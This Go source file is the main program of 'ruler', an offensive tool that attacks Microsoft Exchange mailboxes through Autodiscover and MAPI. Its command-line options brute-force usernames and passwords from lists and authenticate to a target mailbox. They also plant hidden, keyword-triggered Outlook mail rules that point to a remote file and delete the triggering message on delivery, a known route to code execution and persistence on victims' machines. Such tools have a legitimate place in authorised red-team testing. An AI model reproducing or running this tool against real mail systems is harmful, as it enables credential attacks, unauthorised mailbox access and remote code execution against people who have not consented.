package main

import (
	"encoding/hex"
	"flag"
	"fmt"

	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
)

//globals
var config utils.Config

//doRequest to a target domain
func doRequest() {

}

func main() {
	domainPtr := flag.String("domain", "", "The target domain (usually the email address domain)")
	userPtr := flag.String("user", "", "A valid username")
	passPtr := flag.String("pass", "", "A valid password")
	ruleName := flag.String("rule", "", "A name for our rule")
	delRule := flag.String("delete", "", "Delete a rule, requires the ruleid as shown with -display")
	triggerWord := flag.String("trigger", "", "A keyword to trigger on")
	triggerLocation := flag.String("loc", "", "A location for our remote file")
	emailPtr := flag.String("email", "", "The target email address, used to select correct mailbox")
	autoURLPtr := flag.String("url", "", "If you know the Autodiscover URL, supply it here. Default behaviour is to try and find it via the domain")
	autodiscoverOnly := flag.Bool("autodiscover", false, "Only does the autodiscover, useful for checking if you can actually interact with the domain")
	displayRules := flag.Bool("display", false, "Display the current rules")
	tcpPtr := flag.Bool("tcp", false, "If set, we'll use TCP for the MAPI requests. Otherwise, we stick to MAPI over HTTP")
	basicPtr := flag.Bool("basic", false, "Don't try NTLM, just do straight Basic")
	insecurePtr := flag.Bool("insecure", false, "Don't verify SSL/TLS cerificate")
	brutePtr := flag.Bool("brute", false, "Try bruteforce usernames/passwords")
	stopSuccessPtr := flag.Bool("stop", false, "Stop on successfully finding a username/password")
	userList := flag.String("usernames", "", "Filename for a List of usernames")
	passList := flag.String("passwords", "", "Filename for a List of passwords")
	verbosePtr := flag.Bool("v", false, "Be verbose, show failures")
	conscPtr := flag.Int("attempts", 2, "Number of attempts before delay")
	delayPtr := flag.Int("delay", 5, "Delay between attempts")
	flag.Parse()

	if *domainPtr == "" {
		fmt.Println("[x] Domain required")
	}

	if *brutePtr == true {
		fmt.Println("[*] Starting bruteforce")
		autodiscover.BruteForce(*domainPtr, *userList, *passList, *basicPtr, *insecurePtr, *stopSuccessPtr, *verbosePtr, *conscPtr, *delayPtr)
		return
	}

	config.Domain = *domainPtr
	config.User = *userPtr
	config.Pass = *passPtr
	config.Email = *emailPtr
	config.Basic = *basicPtr
	config.Insecure = *insecurePtr
	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	var err error

	if *autodiscoverOnly == true {
		fmt.Println("[*] Doing Autodiscover for domain")
		if *autoURLPtr == "" {
			resp, err = autodiscover.Autodiscover(config.Domain)
		} else {
			resp, err = autodiscover.Autodiscover(*autoURLPtr)
		}

		return
	}

	fmt.Println("[*] Retrieving MAPI info")
	if *autoURLPtr == "" {
		resp, err = autodiscover.MAPIDiscover(config.Domain)
	} else {
		resp, err = autodiscover.MAPIDiscover(*autoURLPtr)
	}

	if resp == nil {
		fmt.Println("[x] The autodiscover service request did not complete.")
		if err != nil {
			fmt.Println(err)
		}
		return
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		fmt.Println("[x] The autodiscover service responded with an error.")
		fmt.Println(resp.Response)
		fmt.Println(resp.Response.Error.Message)
		return
	}
	if *tcpPtr == false {

		mapiURL := mapi.ExtractMapiURL(resp)
		if mapiURL == "" {
			fmt.Println("[x] No MAPI URL found. Exiting...")
			return
		}
		fmt.Println("[+] MAPI URL found: ", mapiURL)
		//strip null byte
		mapi.Init(config, resp.Response.User.LegacyDN, mapiURL, mapi.HTTP)
	} else {
		mapi.Init(config, resp.Response.User.LegacyDN, "", mapi.TCP)
	}

	logon, err := mapi.Authenticate()
	if err != nil {
		fmt.Println(err)
		return
	} else if logon.MailboxGUID != nil {
		fmt.Println("[*] And we are authenticated")
		fmt.Println("[+] Mailbox GUID: ", logon.MailboxGUID)
		fmt.Println("[*] Openning the Inbox")
		mapi.GetFolder()
		if *displayRules == true {
			fmt.Println("[+] Retrieving Rules")
			rules, err := mapi.DisplayRules()
			if err != nil {
				fmt.Println(err)
				return
			}
			fmt.Printf("[+] Found %d rules\n", len(rules))
			for _, v := range rules {
				fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
			}
		}
		if *delRule != "" {
			ruleid, err1 := hex.DecodeString(*delRule)
			if err1 != nil {
				fmt.Println("[x] Incorrect ruleid format. ")
				return
			}

			err = mapi.ExecuteMailRuleDelete(ruleid)
			if err == nil {
				fmt.Println("[*] Rule deleted. Fetching list of remaining rules...")
				rules, err := mapi.DisplayRules()
				if err != nil {
					fmt.Println(err)
					return
				}
				fmt.Printf("[+] Found %d rules\n", len(rules))
				for _, v := range rules {
					fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
				}

			} else {
				fmt.Println(err)
			}

		}
		//mapi.GetContentsTable()
		if *ruleName != "" {
			fmt.Println("[*] Adding Rule")
			//delete message on delivery
			res, err := mapi.ExecuteMailRuleAdd(*ruleName, *triggerWord, *triggerLocation, true)
			if res.StatusCode != 0 {
				fmt.Println("[x] Failed to create rule")
				return
			}
			if err != nil {
				fmt.Println(err)
				return
			}
			fmt.Println("[*] Rule Added. Fetching list of rules...")
			rules, err := mapi.DisplayRules()
			if err != nil {
				fmt.Println(err)
				return
			}
			fmt.Printf("[+] Found %d rules\n", len(rules))
			for _, v := range rules {
				fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
			}
		}
	} else {
		fmt.Println("[x] An error occurred during authentication")
	}
	//contentId := mapi.GetContentsTable()
	//if contentId == nil {
	//	return
	//}
	//mapi.ExecuteFetchMailRules([]byte{0x01, 0x00, 0x00, 0x00, 0x00, 0x1f, 0x21, 0x1d})
	//mapi.ExecuteFetchMailRules(contentId)

	//mapi.Ping()
}
